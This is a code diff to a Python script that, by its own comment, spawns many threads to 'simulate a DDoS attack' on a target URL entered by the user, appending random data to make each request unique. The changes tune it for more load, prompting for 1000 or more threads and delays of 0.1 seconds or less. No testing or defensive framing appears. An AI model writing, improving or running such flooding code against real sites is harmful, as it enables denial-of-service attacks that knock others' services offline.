@@ -2,6 +2,7 @@ import threading
 import requests
 import random
 import string
+import time
 
 def generate_random_data():
     """Generate random data to append to the URL to create unique requests."""
@@ -21,7 +22,9 @@ def main():
     # Get target URL from user input
     url = input("Enter the target URL: ")
     # Number of threads
-    num_threads = int(input("Enter the number of threads: "))
+    num_threads = int(input("Enter the number of threads (suggest 1000+): "))
+    # Delay between requests
+    delay = float(input("Enter the delay between requests in seconds (suggest 0.1 or less): "))
 
     # Create multiple threads to simulate a DDoS attack
     threads = []
@@ -30,6 +33,7 @@ def main():
         thread = threading.Thread(target=attack, args=(url,))
         thread.daemon = True
         threads.append(thread)
+        time.sleep(delay)  # Delay between starting each thread
 
     # Start all threads
     for thread in threads:
